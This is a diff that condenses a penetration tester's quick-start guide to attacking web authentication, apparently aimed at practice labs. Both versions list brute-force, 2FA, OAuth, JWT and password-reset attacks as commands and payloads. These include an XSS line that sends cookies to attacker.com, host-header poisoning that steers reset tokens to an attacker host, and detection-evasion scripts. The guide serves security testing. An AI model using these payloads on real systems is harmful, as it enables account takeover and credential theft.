@@ -1,456 +1,199 @@
-# Authentication Vulnerabilities - Quick Start Guide
+# Authentication — Quick Start
 
-## Rapid Testing Methodology (5-15 Minutes)
+Rapid testing methodology and quick-reference. Detailed scenarios in `INDEX.md` and `scenarios/`.
 
-### Phase 1: Initial Reconnaissance (2 minutes)
+## Recon (2 min)
+
+Identify auth endpoints: `/login`, `/signin`, `/auth`, `/authenticate`, `/oauth`, `/sso`, `/api/auth`. Check `/.well-known/openid-configuration` for OAuth discovery.
+
 ```bash
-# 1. Identify login endpoints
-# Check for: /login, /signin, /auth, /authenticate, /oauth
-
-# 2. Test basic authentication
-curl -X POST https://target.com/login \
-  -d "username=test&password=test" \
-  -v
-
-# 3. Check for authentication methods
-# - Traditional login forms
-# - OAuth/SSO providers
-# - API key authentication
-# - JWT tokens
-# - Multi-factor authentication
+curl -X POST https://target/login -d "username=test&password=test" -v
 ```
 
-### Phase 2: Username Enumeration (3 minutes)
+Identify which method:
+- Traditional form login.
+- OAuth / SSO (look for redirects to identity provider).
+- API key in header / query param.
+- JWT bearer.
+- MFA (look for second-factor flow).
+
+## Username enumeration (3 min)
+
 ```bash
-# Test with valid and invalid usernames
-# Look for differences in:
-# - Response messages
-# - Response length
-# - Response timing
-# - HTTP status codes
-# - Redirect behavior
-
-# Using Burp Suite Intruder:
-# 1. Capture POST /login request
-# 2. Send to Intruder
-# 3. Set username as payload position
-# 4. Load username wordlist
-# 5. Sort by response length
-# 6. Identify valid usernames
+# Burp Intruder:
+# 1. Capture POST /login → Send to Intruder.
+# 2. Mark username as payload position.
+# 3. Load SecLists usernames.
+# 4. Sort by response length / status / time.
+# 5. Diff = enumeration possible.
 ```
 
-### Phase 3: Password Attacks (5 minutes)
+Test for:
+- Different error messages (`Invalid username` vs `Incorrect password`).
+- Response length differences.
+- Timing differences (use long-password trick: `password = "a" * 100`).
+- Account-lockout messages only on valid users.
+
+## Password attacks (5 min)
+
 ```bash
-# 1. Test brute-force protection
-# Multiple failed attempts → Check for account lockout
+# Quick wins:
+# 1. Default credentials (admin:admin, admin:password).
+# 2. Common passwords (Password1, Welcome2024, <Company>2024).
+# 3. Rate-limit bypass via X-Forwarded-For header.
 
-# 2. Test rate limiting bypasses
-# Add X-Forwarded-For header with rotating IPs
-
-# 3. Brute-force passwords for valid usernames
-# Using Burp Intruder with password wordlist
-
-# 4. Test credential stuffing
-# Use leaked credentials from breaches
+# Hydra basic:
+hydra -L users.txt -P passwords.txt target.com http-post-form \
+  "/login:user=^USER^&pass=^PASS^:Invalid"
 ```
 
-### Phase 4: Authentication Bypass (5 minutes)
+Detailed: `scenarios/password-attacks/online-brute-force.md`, `dictionary-attack.md`, `password-spraying.md`.
+
+## 2FA bypass (5 min)
+
+Test in this order:
+1. **Direct endpoint access**: skip 2FA page, navigate to `/dashboard` after password (`scenarios/2fa/direct-endpoint-access.md`).
+2. **Response manipulation**: flip `success: false` → `true` at proxy (`response-manipulation.md`).
+3. **OTP parameter manipulation**: empty/null/array (`otp-parameter-manipulation.md`).
+4. **Brute-force OTP**: 4-digit space = 10K (`brute-force-otp.md`).
+5. **Code reuse**: replay valid OTP (`code-reuse.md`).
+
+## OAuth quick checks
+
 ```bash
-# 1. Test parameter manipulation
-# Change user_id, role, admin parameters in cookies/tokens
-# Try adding client-side role cookies: Cookie: UserRole=admin, role=admin, isAdmin=true
-# Web panels may gate admin features (file upload, config) behind client-side cookie checks
+# 1. Check for missing state parameter
+GET /auth?client_id=...&redirect_uri=...&response_type=code   # no &state=
 
-# 2. Test forced browsing
-# After login page, directly access /admin, /dashboard
+# 2. redirect_uri attacker injection
+?redirect_uri=https://attacker.com
+?redirect_uri=https://target.com.attacker.com
+?redirect_uri=https://target.com@attacker.com
 
-# 3. Test OAuth flows
-# Modify email in POST /authenticate
-# Check for state parameter in OAuth URLs
+# 3. Implicit flow tokens in fragment
+?response_type=token        # exposes tokens in URL
 
-# 4. Test 2FA bypasses
-# Skip verification by accessing protected pages directly
-# Manipulate verify parameter to target other users
+# 4. Discovery
+curl /.well-known/openid-configuration
 ```
 
-## Common Attack Vectors
+Detailed: `scenarios/oauth/`.
 
-### 1. Username Enumeration
+## JWT quick checks
 
-**Different Response Messages:**
-```
-Invalid username: "Invalid username or password"
-Valid username: "Incorrect password"
-```
+```bash
+# 1. Decode token
+echo "<header>.<payload>.<sig>" | cut -d. -f2 | base64 -d | jq
 
-**Timing Attacks:**
-```python
-# Valid usernames process password hash, taking longer
-import time
-import requests
+# 2. Try alg:none
+echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
+echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
+# Combine: <h>.<p>.
 
-def check_timing(username):
-    start = time.time()
-    requests.post("https://target.com/login",
-        data={"username": username, "password": "a"*100})
-    return time.time() - start
+# 3. Crack weak secret
+hashcat -m 16500 jwt.txt jwt.secrets.list
 
-# Valid users take longer (>0.1s difference)
+# 4. Check JWKS exposure
+curl https://target/.well-known/jwks.json
 ```
 
-**Account Lock Behavior:**
-```
-Invalid username: Never locks
-Valid username: "Too many attempts" after 3-5 tries
-```
+Detailed: `scenarios/jwt/`.
 
-### 2. Brute-Force Protection Bypasses
+## Session attacks (5 min)
 
-**IP Rotation:**
-```http
-POST /login HTTP/1.1
-Host: target.com
-X-Forwarded-For: 1.1.1.1
+```bash
+# 1. Decode session cookie
+echo "<cookie>" | base64 -d
 
-username=admin&password=test1
-
-# Increment IP for each attempt
+# 2. Modify cookie components (try /; user/admin; perms)
+# 3. Test session fixation (set victim's session via XSS)
+# 4. Test session timeout enforcement
+# 5. Check Secure / HttpOnly / SameSite flags
 ```
 
-**Counter Reset:**
-```
-# Alternate between valid login and attack
-1. username=your_account&password=your_pass (success, resets counter)
-2. username=target&password=test1 (attempt)
-3. username=your_account&password=your_pass (success, resets counter)
-4. username=target&password=test2 (attempt)
+## Password reset attacks (3 min)
+
+```bash
+# 1. Token predictability — generate multiple tokens, look for patterns
+curl /reset_password -d "email=test@test.com" → captures token
+# Generate 10, look for: time-based, sequential, low entropy
+
+# 2. Host header poisoning
+curl -H "Host: attacker.com" /reset_password -d "email=victim@target.com"
+# Reset link goes to attacker.com → captures token
+
+# 3. Token validation tests
+curl /reset?token=             # empty
+curl /reset?token=null
+curl /reset?token[]=ABC        # array
 ```
 
-**Multiple Credentials Per Request:**
-```json
+## Common bypasses
+
+### Rate limit bypass via headers
+
+```
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+```
+
+Each header = different rate-limit bucket. Rotate.
+
+### Lockout bypass
+
+```bash
+# Some apps reset counter on successful login from same session
+# Send 4 wrong → 1 right → 4 wrong (no lockout)
+```
+
+### Multi-credential per request (GraphQL / batch)
+
+```graphql
 {
-  "username": "carlos",
-  "password": ["pass1", "pass2", "pass3", "pass4"]
+  login1: login(username: "u1", password: "p1") { token }
+  login2: login(username: "u2", password: "p2") { token }
+  login3: login(username: "u3", password: "p3") { token }
 }
 ```
 
-### 3. Multi-Factor Authentication Bypasses
+One HTTP request → many auth attempts → bypasses per-request rate limit.
 
-**Simple Bypass:**
-```
-1. Login with username:password
-2. Reach 2FA verification page
-3. Manually navigate to /my-account (skip verification)
-```
+## Top wordlists
 
-**Parameter Manipulation:**
-```http
-POST /login2 HTTP/1.1
-Host: target.com
+| Use | File |
+|---|---|
+| Generic passwords | `rockyou.txt` |
+| Top common | `SecLists/Common-Credentials/10k-most-common.txt` |
+| Best 110 | `SecLists/Common-Credentials/best110.txt` |
+| Default creds | `SecLists/Default-Credentials/...` |
+| Usernames | `SecLists/Usernames/Names/...` |
+| JWT secrets | `jwt.secrets.list` |
 
-mfa-code=1234&verify=carlos
+## Tool quick reference
 
-# The 'verify' parameter controls which user's account is accessed
-# Manipulate to target other users
-```
+| Tool | Purpose |
+|---|---|
+| Burp Suite (Intruder) | Web auth fuzzing |
+| Hydra | SSH/FTP/SMB/RDP brute force |
+| CrackMapExec / NetExec | Bulk SMB/WinRM/MSSQL |
+| jwt_tool | JWT manipulation |
+| Hashcat / John | Offline hash cracking |
+| Responder / Inveigh | NTLM hash capture |
+| evil-winrm | WinRM PtH |
+| impacket | NTLM PtH (psexec.py / wmiexec.py) |
+| ffuf | Generic HTTP fuzzing |
 
-**Brute-Force 2FA Codes:**
-```bash
-# 4-digit codes: 0000-9999 (10,000 combinations)
-# Use Burp Intruder with Numbers payload type
-# Range: 0-9999, Step: 1, Digits: 4
-# Set resource pool to 1 concurrent request
-# Configure session handling macro for re-authentication
-```
+## Decision tree
 
-### 4. OAuth Vulnerabilities
-
-**Implicit Flow Bypass:**
-```http
-POST /authenticate HTTP/1.1
-Host: target.com
-Content-Type: application/json
-
-{
-  "email": "victim@target.com",
-  "username": "victim",
-  "token": "attacker_valid_token"
-}
-
-# Modify email parameter to target victim
-```
-
-**Missing State Parameter:**
-```html
-<!-- CSRF in OAuth profile linking -->
-<iframe src="https://target.com/oauth-linking?code=STOLEN_CODE"></iframe>
-```
-
-**redirect_uri Exploitation:**
-```
-# Original:
-https://oauth-server.com/auth?redirect_uri=https://target.com/callback
-
-# Exploit:
-https://oauth-server.com/auth?redirect_uri=https://attacker.com
-https://oauth-server.com/auth?redirect_uri=https://target.com/callback/../proxy-page
-```
-
-### 5. Session Management Issues
-
-**Stay-Logged-In Cookie:**
-```
-# Cookie structure: base64(username:md5(password))
-Cookie: stay-logged-in=Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl
-
-# Decode:
-carlos:e10adc3949ba59abbe56e057f20f883e
-
-# Brute-force password, construct valid cookie
-```
-
-**XSS for Cookie Theft:**
-```javascript
-<script>
-document.location='//attacker.com/'+document.cookie
-</script>
-```
-
-### 6. Password Reset Vulnerabilities
-
-**Broken Token Validation:**
-```http
-POST /forgot-password HTTP/1.1
-Host: target.com
-
-temp-forgot-password-token=&username=carlos&new-password=hacked
-
-# Empty token still accepted
-```
-
-**Host Header Poisoning:**
-```http
-POST /forgot-password HTTP/1.1
-Host: target.com
-X-Forwarded-Host: attacker.com
-
-username=carlos
-
-# Reset link: https://attacker.com/reset?token=VICTIM_TOKEN
-```
-
-**Password Change Enumeration:**
-```http
-POST /change-password HTTP/1.1
-
-username=carlos&current-password=test&new-password-1=123&new-password-2=abc
-
-# "New passwords do not match" → current password correct
-# "Current password incorrect" → wrong password (no lockout)
-```
-
-### 7. Business Logic Flaws
-
-**Flawed State Machine:**
-```
-Normal: POST /login → GET /role-selector → POST /role-selector → GET /
-Exploit: POST /login → DROP /role-selector → GET / (defaults to admin)
-```
-
-**Encryption Oracle:**
-```
-# Application encrypts/decrypts user input
-1. Identify encryption oracle endpoints
-2. Encrypt: administrator:timestamp
-3. Manipulate ciphertext (remove prefix blocks)
-4. Use as stay-logged-in cookie
-```
-
-## Burp Suite Quick Commands
-
-### Intruder Configuration
-```
-Attack Types:
-- Sniper: Single payload position (username OR password)
-- Pitchfork: Multiple positions, corresponding payloads (IP + username)
-- Cluster Bomb: All combinations (username × password)
-
-Payload Processing:
-1. Add prefix: "username:"
-2. Hash: MD5
-3. Encode: Base64
-
-Grep Match:
-- Success indicators: "Welcome", "Logout", "Update email"
-- Error messages: "Invalid", "Incorrect"
-
-Resource Pool:
-- Max concurrent: 1 (for session-based attacks)
-```
-
-### Repeater Workflow
-```
-1. Capture request
-2. Send to Repeater
-3. Modify parameters
-4. Observe response
-5. Test variations
-```
-
-### Session Handling Macros
-```
-For 2FA brute-force:
-1. Settings → Sessions → Session Handling Rules
-2. Add new rule
-3. Add macro with login sequence:
-   - GET /login
-   - POST /login
-   - GET /login2
-4. Set scope to include target URLs
-```
-
-## Common Wordlists
-
-### Username Lists
-```bash
-# Common usernames
-admin
-administrator
-root
-user
-test
-guest
-carlos
-wiener
-
-# SecLists
-https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt
-```
-
-### Password Lists
-```bash
-# Top passwords
-password
-123456
-admin
-letmein
-welcome
-
-# SecLists
-/usr/share/wordlists/rockyou.txt
-/usr/share/seclists/Passwords/Common-Credentials/
-```
-
-## Quick Wins Checklist
-
-### 5-Minute Tests
-- [ ] Test username enumeration via error messages
-- [ ] Try default credentials (admin:admin, admin:password)
-- [ ] Test SQL injection in login (`admin'--`, `admin' OR '1'='1`)
-- [ ] Check for missing 2FA enforcement
-- [ ] Test direct access to /admin after partial authentication
-- [ ] Look for exposed credentials in JavaScript/HTML comments
-- [ ] Test password reset with no/empty token
-- [ ] Check for OAuth state parameter
-- [ ] Test session fixation/hijacking
-
-### 15-Minute Deep Dive
-- [ ] Brute-force usernames with timing analysis
-- [ ] Test IP-based rate limiting bypass
-- [ ] Enumerate passwords for valid usernames
-- [ ] Test 2FA parameter manipulation
-- [ ] Analyze stay-logged-in cookie structure
-- [ ] Test OAuth redirect_uri validation
-- [ ] Check for host header poisoning in password reset
-- [ ] Test account lock bypass techniques
-- [ ] Look for business logic flaws in authentication flow
-
-## Detection Evasion
-
-### Rate Limiting Bypass
-```http
-# Rotate headers
-X-Forwarded-For: 1.1.1.1
-X-Originating-IP: 1.1.1.1
-X-Remote-IP: 1.1.1.1
-X-Client-IP: 1.1.1.1
-```
-
-### Timing and Throttling
-```python
-import time
-import random
-
-def smart_brute_force(username, passwords):
-    for password in passwords:
-        # Random delay between requests
-        time.sleep(random.uniform(0.5, 2.0))
-
-        # Test credential
-        result = test_login(username, password)
-
-        if result.status_code == 302:
-            return password
-```
-
-### User-Agent Rotation
-```python
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-    "Mozilla/5.0 (X11; Linux x86_64)"
-]
-```
-
-## Success Indicators
-
-### Valid Username Found
-- Different error message
-- Different response length
-- Longer response time
-- Account lockout message
-- Password reset email sent
-
-### Valid Password Found
-- HTTP 302 redirect
-- Session cookie issued
-- "Welcome" or "Logout" in response
-- Access to protected resources
-
-### 2FA Bypassed
-- Access to protected pages without verification
-- Session established without code
-- Parameter manipulation accepted
-
-### OAuth Exploited
-- Authentication as victim user
-- Access token leaked
-- Admin access via social profile linking
-
-## Common Mistakes to Avoid
-
-1. **Not testing systematically** - Test one thing at a time
-2. **Ignoring subtle differences** - Whitespace, punctuation matter
-3. **Using wrong attack type** - Pitchfork vs Cluster Bomb
-4. **Not handling sessions** - Use macros for session-based attacks
-5. **Missing response analysis** - Sort by length, status, timing
-6. **Forgetting to URL-encode** - Encode special characters
-7. **Not testing all parameters** - Check cookies, headers, JSON
-8. **Rushing past reconnaissance** - Understand the flow first
+- **Login form** → `password-attacks/online-brute-force.md` (defaults, dict), `password-spraying.md` (if lockout), `scenarios/2fa/` (MFA), `oauth/` (SSO), `jwt/` (JWT).
+- **API key / Bearer** → JWT inspection at jwt.io; `scenarios/jwt/<picked-by-alg>`.
+- **Have hash** → `password-attacks/hash-cracking.md`, `encrypted-container-cracking.md`, `pass-the-hash.md`.
+- **Foothold** → `credential-dumping.md`, `ssh-controlmaster-hijack.md`, `db-hash-lateral-movement.md`.
 
 ## Resources
 
-### Tools
-- Burp Suite: https://portswigger.net/burp
-- Hydra: https://github.com/vanhauser-thc/thc-hydra
-- Patator: https://github.com/lanjelot/patator
-- SecLists: https://github.com/danielmiessler/SecLists
-
-### References
-- OWASP Authentication: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/
-- OAuth 2.0 RFC: https://tools.ietf.org/html/rfc6749
-- NIST Guidelines: https://pages.nist.gov/800-63-3/
-
----
-
-*Quick-start guide for rapid authentication vulnerability testing*
+- `INDEX.md`, `authentication-principles.md`, `authentication-cheat-sheet.md`.
+- PortSwigger Web Security Academy: https://portswigger.net/web-security/authentication
